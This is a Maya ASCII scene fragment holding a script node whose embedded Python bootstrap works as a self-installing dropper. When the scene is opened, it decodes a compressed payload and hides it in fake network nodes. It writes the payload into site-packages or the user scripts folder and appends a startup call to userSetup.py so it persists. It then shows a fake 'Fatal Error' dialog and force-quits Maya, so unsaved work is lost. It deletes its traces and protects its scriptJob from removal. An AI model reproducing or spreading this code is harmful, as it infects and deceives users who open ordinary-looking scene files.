createNode script -n "maya_secure_system_scriptNode";
	rename -uid "1A6C87C4-461D-1492-A645-0EA3A6362274";
	addAttr -ci true -sn "isCompressed" -ln "isCompressed" -dv 1 -min 0 -max 1 -at "bool";
	setAttr ".b" -type "string" (
		"\n# Embedded Bootstrap - Maya Secure System Stager (No 'os' or 'json')\n# WARNING: Executes code extracted from scene, updates userSetup.py, and forces Maya quit on first install.\nimport maya.cmds as cmds\nimport base64, zlib, sys, random, _io # Note: 'random' is imported but not used\nimport maya.mel as mel\n\ndef generate_fake_crash_path_maya_only():\n    try:\n        # 1. Get Maya's user temporary directory path using MEL\n        temp_dir_raw = mel.eval('internalVar -userTmpDir')\n        if not temp_dir_raw:\n             temp_dir = \"C:/Maya/Temp\" # Generic fallback\n        else:\n             temp_dir = temp_dir_raw.replace('\\\\', '/')\n             if temp_dir.endswith('/'):\n                 temp_dir = temp_dir[:-1]\n\n        # 2. Get the OS username using MEL getenv (try USERNAME then USER)\n        username = \"\"\n        try:\n            username_win = mel.eval('getenv \"USERNAME\"')\n            if username_win:\n                username = username_win\n            else:\n                username_unix = mel.eval('getenv \"USER\"')\n"
		+ "                if username_unix:\n                    username = username_unix\n        except Exception as e_getenv:\n             print(f\"Warning: Could not get username via MEL getenv: {e_getenv}\")\n\n        if not username:\n            username = \"MayaUser\" # Fallback username\n\n        # 3. Get current date and time using cmds.date()\n        try:\n            # Format: YYYYMMDD\n            date_str = cmds.date(format='YYYYMMDD')\n            # Format: HHMM (24-hour)\n            time_str = cmds.date(format='hhmm')\n        except Exception as e_date:\n            print(f\"Warning: Could not get date/time via cmds.date: {e_date}\")\n            date_str = \"DateError\"\n            time_str = \"TimeError\"\n\n        # 4. Construct the filename using available info\n        #    Clean username just in case it has invalid characters for filename (basic)\n        safe_username = \"\".join(c for c in username if c.isalnum() or c in ('_', '-'))\n        if not safe_username: safe_username = \"MayaUser\" # Ensure not empty after cleaning\n"
		+ "\n        filename = f\"{safe_username}.{date_str}.{time_str}.ma\"\n\n        # 5. Combine directory and filename using forward slash\n        full_path = f\"{temp_dir}/{filename}\"\n\n        return full_path\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n        # Provide a very generic fallback path\n        return \"C:/TEMP/MayaCouldNotGeneratePath.ma\"\n\n\ndef show_fake_crash_popup_and_quit_maya_only():\n    window_title = \"maya\"\n    generated_path = generate_fake_crash_path_maya_only()\n\n    error_message = f\"Fatal Error. Attempting to save in {generated_path}\\n\\nMaya will attempt to repair itself on next startup\"\n    button_label = \"OK\"\n\n    # Display the confirmation dialog\n    result = cmds.confirmDialog(\n        title=window_title,\n        message=error_message,\n        button=[button_label],\n        defaultButton=button_label,\n        cancelButton=button_label,  # Make closing the window act like clicking OK\n        dismissString='Closed',     # Value if closed differently (unlikely here)\n        icon='warning'\n"
		+ "    )\n\n    # Check if the result matches the OK button label (or window closed)\n    if result == button_label:\n        #print(f\"Fake Crash Dialog: OK pressed/Window closed (path: {generated_path}). Forcing quit...\")\n        try:\n            # Force quit Maya using MEL command\n            mel.eval('quit -f;')\n        except Exception as e:\n            cmds.warning(f\"Exception during quit command (Maya might already be closing): {e}\")\n\n# --- Configuration (Filled by outer script) ---\n_SCRIPT_NODE_NAME = 'maya_secure_system_scriptNode'\n_TARGET_FILE_NAME = 'maya_secure_system.py'\n_MODULE_NAME = 'maya_secure_system'\n_DEBUG_MODE = False # Force False in payload\ndie = True\n# --- End Configuration ---\n\ndef _log_bootstrap(msg):\n    # Basic logging within bootstrap, respects internal _DEBUG_MODE\n    if _DEBUG_MODE: print(f\"[Bootstrap] {msg}\") # Escaped f-string brace\n\n# --- Stage 2: Extraction, Installation, Crash ---\n# This function is defined globally within the bootstrap scope so the scriptJob can find it.\ndef _extract_stage():\n"
		+ "    _log_bootstrap(\"Extraction stage (_extract_stage) initiated.\")\n    # Ensure the main node exists before proceeding\n    if not cmds.objExists(\"codeExtractor\"):\n        _log_bootstrap(\"Extractor node 'codeExtractor' missing. Aborting extraction.\")\n        return\n\n    # --- Initialize variables for this stage ---\n    code = \"\"\n    target_file = None\n    module_name = None\n    write_path = None\n    successful_dir = None # Store the directory where write succeeded\n    write_successful = False\n    did_modify_user_setup = False # Flag to track if userSetup.py is modified this run\n\n\n    # 1. Extract metadata and reassemble code from network nodes\n    _log_bootstrap(\"Extracting metadata and code...\")\n    # Get metadata from separate attributes (no json)\n    target_file = cmds.getAttr(\"codeExtractor.targetFileNameAttr\")\n    module_name = cmds.getAttr(\"codeExtractor.moduleNameAttr\")\n    chunk_count = cmds.getAttr(\"codeExtractor.chunkCount\")\n    _log_bootstrap(f\"Expecting {chunk_count} chunks for '{module_name}' -> '{target_file}'\") # Escaped f-string braces\n"
		+ "\n    # Reassemble the code string\n    for i in range(chunk_count):\n        node_name = f\"codeChunk{i}\" # Escaped f-string brace\n        if cmds.objExists(node_name):\n            try:\n                code += cmds.getAttr(f\"{node_name}.codeFragment\") # Escaped f-string brace\n            except Exception as e_chunk:\n                _log_bootstrap(f\"Warning: Error reading chunk {i} from {node_name}: {e_chunk}\") # Escaped f-string braces\n        else:\n             _log_bootstrap(f\"Warning: Chunk node {node_name} missing.\") # Escaped f-string brace\n\n    if not code:\n        raise ValueError(\"Failed to reassemble code (code is empty).\")\n    _log_bootstrap(f\"Code reassembled ({len(code)} chars).\") # Escaped f-string brace\n\n    # 2. Determine target installation paths (no os module)\n    _log_bootstrap(\"Determining installation paths...\")\n    maya_exe = sys.executable.replace('\\\\', '/') # Normalize slashes\n    maya_root = '/'.join(maya_exe.split('/')[:-2]) # Navigate up from /bin/maya.exe\n\n    # Use _old_py_path determined earlier in the bootstrap scope\n"
		+ "    if _old_py_path:\n        site_packages_dir = maya_root + \"/Python37/Lib/site-packages\"\n    else:\n        # Assume Maya 2023+ path structure (adjust if more versions need specific paths)\n        site_packages_dir = maya_root + \"/Python/Lib/site-packages\"\n    # Construct path using string formatting (no os.path.join)\n    primary_target_path = f\"{site_packages_dir}/{target_file}\"\n\n    # Fallback path is user scripts directory\n    user_scripts_dir = cmds.internalVar(userScriptDir=True).replace('\\\\', '/')\n    # Construct path using string formatting (no os.path.join)\n    fallback_target_path = f\"{user_scripts_dir}/{target_file}\"\n    _log_bootstrap(f\"Primary path: {primary_target_path}\") # Escaped f-string brace\n    _log_bootstrap(f\"Fallback path: {fallback_target_path}\") # Escaped f-string brace\n\n    # 3. Attempt writing the file (try primary, then fallback)\n    _log_bootstrap(f\"Attempting to write file: {target_file}\") # Escaped f-string brace\n    try:\n        # Try primary (site-packages)\n        _log_bootstrap(f\"Attempting primary path: {primary_target_path}\") # Escaped f-string brace\n"
		+ "        # NOTE: Cannot use os.makedirs. Write will fail if site_packages_dir doesn't exist or lacks permissions.\n        with _io.open(primary_target_path, \"w\", encoding='utf-8') as f:\n            f.write(code)\n        write_successful = True\n        write_path = primary_target_path\n        successful_dir = site_packages_dir # Store the successful directory\n        _log_bootstrap(\"Write to primary path successful.\")\n    except Exception as e_primary:\n        _log_bootstrap(f\"Write to primary path failed: {e_primary}\") # Escaped f-string brace\n        # Try fallback (user scripts)\n        try:\n            _log_bootstrap(f\"Attempting fallback path: {fallback_target_path}\") # Escaped f-string brace\n            # NOTE: Per user request, assuming user_scripts_dir exists, so no os.makedirs needed.\n            with _io.open(fallback_target_path, \"w\", encoding='utf-8') as f:\n                f.write(code)\n            write_successful = True\n            write_path = fallback_target_path\n            successful_dir = user_scripts_dir # Store the successful directory\n"
		+ "            _log_bootstrap(\"Write to fallback path successful.\")\n        except Exception as e_fallback:\n            _log_bootstrap(f\"Write to fallback path also failed: {e_fallback}\") # Escaped f-string brace\n            # Raise error only if both attempts fail\n            raise IOError(f\"Failed to write module to both primary and fallback locations.\") from e_fallback\n\n    # 4. Update userSetup.py and trigger crash if first install\n    if write_successful and write_path and successful_dir and module_name: # Check successful_dir too\n        _log_bootstrap(\"Module file written successfully. Updating userSetup.py...\")\n        # Construct path using string formatting (no os.path.join)\n        user_setup_path = f\"{user_scripts_dir}/userSetup.py\"\n\n        # Strings to check if module is already imported/started in userSetup\n        check_string_import = f\"import {module_name}\" # Escaped f-string brace\n        check_string_startup = f\"{module_name}.MayaSecureSystem().startup()\" # Escaped f-string brace\n\n        # The code block to add to userSetup.py\n"
		+ "        # Ensure it adds the successful directory (captured above) to sys.path\n        # Escape braces for outer .format AND for inner f-strings\n        import_statement = [\n            f\"import maya_secure_system\", # Escaped f-string brace\n            f\"maya_secure_system.MayaSecureSystem().startup()\", # Escaped f-string brace\n        ]\n        # All inner braces need escaping for the outer .format()\n\n        needs_update = True # Assume update is needed unless proven otherwise\n        setup_content = \"\"\n        try:\n            # Try reading userSetup.py first (no os.path.exists)\n            with _io.open(user_setup_path, \"r\", encoding='utf-8') as f:\n                setup_content = f.read()\n            _log_bootstrap(\"Read existing userSetup.py.\")\n            # Check if both import and startup call seem present\n            if check_string_import in setup_content and check_string_startup in setup_content:\n                needs_update = False\n                _log_bootstrap(\"userSetup.py already contains import/startup call. Skipping update/crash.\")\n"
		+ "\n        except IOError: # Catches FileNotFoundError in Py3, general IO errors\n             _log_bootstrap(\"userSetup.py does not exist or could not be read. Will create/append.\")\n        except Exception as e_read:\n            _log_bootstrap(f\"Warning: Error checking userSetup.py: {e_read}. Proceeding with update attempt.\") # Escaped f-string brace\n\n        # Perform the update if needed\n        if needs_update:\n            _log_bootstrap(f\"Attempting to update {user_setup_path}...\") # Escaped f-string brace\n            try:\n                # Append mode 'a' creates the file if it doesn't exist\n                with _io.open(user_setup_path, \"a\", encoding='utf-8') as f:\n                    for line in import_statement:\n                        print(line, file=f)\n                did_modify_user_setup = True # Set flag *after* successful write\n                _log_bootstrap(\"userSetup.py updated successfully.\")\n\n                # <<< !!! CRASH POINT !!! >>>\n                # Only crash if userSetup.py was *actually modified* in this run.\n"
		+ "                _log_bootstrap(\"First time setup successful. Forcing Maya quit to finalize installation.\")\n                _log_bootstrap(\"****** UNSAVED WORK WILL BE LOST! ******\")\n                # Use MEL's force quit command - check _DEBUG_MODE one last time\n                if die:\n                    show_fake_crash_popup_and_quit_maya_only()\n\n            except Exception as e_setup:\n                _log_bootstrap(f\"ERROR updating userSetup.py at {user_setup_path}: {e_setup}\") # Escaped f-string brace\n                # Do not crash if the update fails.\n\n        # 5. Import module for current session (only runs if NOT first install OR crash failed)\n        if not did_modify_user_setup:\n            _log_bootstrap(\"Not first install run or crash failed. Attempting import for current session.\")\n            if successful_dir not in sys.path:\n                sys.path.insert(0, successful_dir)\n                _log_bootstrap(f\"Added '{successful_dir}' to sys.path.\") # Escaped f-string brace\n\n            try:\n                # Re-importing might be needed if module was already loaded in a previous session\n"
		+ "                # but userSetup wasn't updated correctly then.\n                _log_bootstrap(f\"Importing/Re-importing module: {module_name}\") # Escaped f-string brace\n                __import__(module_name)\n                # If module was already imported, __import__ might not re-execute top-level code.\n                # Reloading is complex without importlib. This might be sufficient for many cases.\n                # Optionally call startup for the current session if needed, but be wary of double execution.\n                # if hasattr(sys.modules[module_name], 'MayaSecureSystem'):\n                #      getattr(sys.modules[module_name], 'MayaSecureSystem')().startup()\n\n            except ImportError as e_import:\n                 _log_bootstrap(f\"Failed to import module '{module_name}' in current session: {e_import}\") # Escaped f-string brace\n            except Exception as e_mod:\n                 _log_bootstrap(f\"Error during module import/reload for '{module_name}': {e_mod}\") # Escaped f-string brace\n\n    elif not write_successful:\n"
		+ "        # This case means writing the module file failed in both locations\n         _log_bootstrap(f\"ERROR: Failed to write the module '{target_file}'. Installation aborted.\") # Escaped f-string brace\n\n\n    # 6. Cleanup staging nodes (always attempt this)\n    _log_bootstrap(\"Initiating cleanup of staging nodes...\")\n    if cmds.objExists(\"codeExtractor\"):\n        try:\n            chunk_count_final = 0\n            try:\n                # Try to get chunk count again for accurate cleanup\n                chunk_count_final = cmds.getAttr(\"codeExtractor.chunkCount\")\n            except:\n                # If count attribute missing, estimate based on connections or guess\n                try:\n                    connected_nodes = cmds.listConnections(\"codeExtractor.message\", d=True, s=False, type=\"network\")\n                    chunk_count_final = len(connected_nodes) if connected_nodes else 50\n                except: chunk_count_final = 50 # Final fallback guess\n                _log_bootstrap(f\"Could not get chunkCount attribute, estimated {chunk_count_final} chunks.\") # Escaped f-string brace\n"
		+ "\n            # Delete chunk nodes (check a few extra just in case)\n            for i in range(chunk_count_final + 10):\n                node_name = f\"codeChunk{i}\" # Escaped f-string brace\n                if cmds.objExists(node_name):\n                    try: cmds.delete(node_name)\n                    except Exception as e_del_chunk: _log_bootstrap(f\"Error deleting chunk node {node_name}: {e_del_chunk}\") # Escaped f-string braces\n\n            # Delete the main extractor node last\n            cmds.delete(\"codeExtractor\")\n            _log_bootstrap(\"Staging nodes cleanup finished.\")\n        except Exception as e_final_clean:\n            _log_bootstrap(f\"ERROR during staging node cleanup: {e_final_clean}\") # Escaped f-string brace\n    else:\n         _log_bootstrap(\"No staging nodes found to clean up.\")\n\n# Make the extraction function globally available within the bootstrap's execution scope\n# so that the evalDeferred call in the scriptJob can find it.\nglobals()['_extract_stage'] = _extract_stage\n_log_bootstrap(\"Bootstrap loaded and extraction stage defined.\")\n"
		+ "\nif sys.version_info.major > 2:\n    _log_bootstrap(\"Python 3 detected.\")\n    # Determine if older Python path structure is needed (e.g., Maya 2022)\n    _old_py_path = False\n    try:\n        _maya_version = int(cmds.about(v=True))\n        if _maya_version == 2022: _old_py_path = True\n    except Exception as e_vers:\n        _log_bootstrap(f\"Warning: Could not determine Maya version: {e_vers}\") # Escaped f-string brace\n        _maya_version = 0 # Default version if check fails\n\n    # --- Stage 1: Hide Payload in Network Nodes ---\n    # Check if staging node already exists to prevent re-running staging\n    if not cmds.objExists(\"codeExtractor\"):\n        _log_bootstrap(\"Staging payload into network nodes...\")\n        try:\n            # Get the main payload (compressed code) from the 'after' attribute\n            code_b64 = cmds.getAttr(f\"{_SCRIPT_NODE_NAME}.after\") # Escaped f-string brace\n            if not code_b64: raise ValueError(\"Payload not found in .after attribute\")\n\n            # Create the main extractor node\n"
		+ "            cmds.createNode(\"network\", name=\"codeExtractor\")\n            cmds.addAttr(\"codeExtractor\", ln=\"dynamicInput\", dt=\"string\") # Placeholder attr\n\n            # Add separate attributes for metadata (no json module)\n            cmds.addAttr(\"codeExtractor\", ln=\"targetFileNameAttr\", dt=\"string\")\n            cmds.addAttr(\"codeExtractor\", ln=\"moduleNameAttr\", dt=\"string\")\n            cmds.setAttr(\"codeExtractor.targetFileNameAttr\", _TARGET_FILE_NAME, type=\"string\")\n            cmds.setAttr(\"codeExtractor.moduleNameAttr\", _MODULE_NAME, type=\"string\")\n            _log_bootstrap(\"Metadata attributes added.\")\n\n            # Decompress and chunk the main code\n            code = zlib.decompress(base64.b64decode(code_b64)).decode('utf-8')\n            chunk_size = 1000 # Size of chunks to store\n            chunks = [code[i:i+chunk_size] for i in range(0, len(code), chunk_size)]\n            _log_bootstrap(f\"Code split into {len(chunks)} chunks.\") # Escaped f-string brace\n\n            # Create a network node for each chunk\n"
		+ "            for i, chunk in enumerate(chunks):\n                node_name = f\"codeChunk{i}\" # Escaped f-string brace\n                cmds.createNode(\"network\", name=node_name)\n                cmds.addAttr(node_name, ln=\"codeFragment\", dt=\"string\")\n                cmds.setAttr(f\"{node_name}.codeFragment\", chunk, type=\"string\") # Escaped f-string brace\n                cmds.addAttr(node_name, ln=\"dynamicInput\", dt=\"string\")\n                # Connect nodes to make it look like a dependency network\n                cmds.connectAttr(\"codeExtractor.message\", f\"{node_name}.dynamicInput\", f=True) # Escaped f-string brace\n\n            # Store the number of chunks\n            cmds.addAttr(\"codeExtractor\", ln=\"chunkCount\", at=\"long\")\n            cmds.setAttr(\"codeExtractor.chunkCount\", len(chunks))\n            _log_bootstrap(\"Payload staged successfully.\")\n\n            # Schedule Stage 2 (Extraction) using a scriptJob triggered by time change\n            # Ensure the extraction function is globally defined first\n            if '_extract_stage' in globals():\n"
		+ "                 cmds.scriptJob(\n                     event=[\"timeChanged\", lambda: cmds.evalDeferred('_extract_stage()', lowestPriority=True)], # Use lambda and lowestPriority\n                     runOnce=True, protected=True # Run once and protect from user deletion\n                 )\n                 # Trigger the time change event to run the scriptJob\n                 current_time = cmds.currentTime(q=True)\n                 cmds.currentTime(current_time + 0.01, edit=True) # Small increment\n                 _log_bootstrap(\"Extraction job scheduled and triggered via time change.\")\n            else:\n                 _log_bootstrap(\"ERROR: _extract_stage function not defined globally. Cannot schedule extraction.\")\n\n        except Exception as e_stage:\n            _log_bootstrap(f\"ERROR during staging phase: {e_stage}\") # Escaped f-string brace\n            # Attempt cleanup if staging failed partially\n            if cmds.objExists(\"codeExtractor\"):\n                _log_bootstrap(\"Attempting cleanup of failed staging...\")\n"
		+ "                try:\n                    # Delete chunk nodes first\n                    chunk_count_guess = 50 # Guess if count attribute wasn't set\n                    try: chunk_count_guess = cmds.getAttr(\"codeExtractor.chunkCount\") + 5\n                    except: pass\n                    for i in range(chunk_count_guess):\n                         node_name = f\"codeChunk{i}\" # Escaped f-string brace\n                         if cmds.objExists(node_name): cmds.delete(node_name)\n                    # Delete main node\n                    cmds.delete(\"codeExtractor\")\n                    _log_bootstrap(\"Partial staging cleanup finished.\")\n                except Exception as e_clean:\n                    _log_bootstrap(f\"Cleanup failed: {e_clean}\") # Escaped f-string brace\n    else:\n         _log_bootstrap(\"Staging node 'codeExtractor' already exists. Assuming staging complete or in progress. Skipping staging.\")\n\n\n\n# --- End of Embedded Bootstrap ---\n");
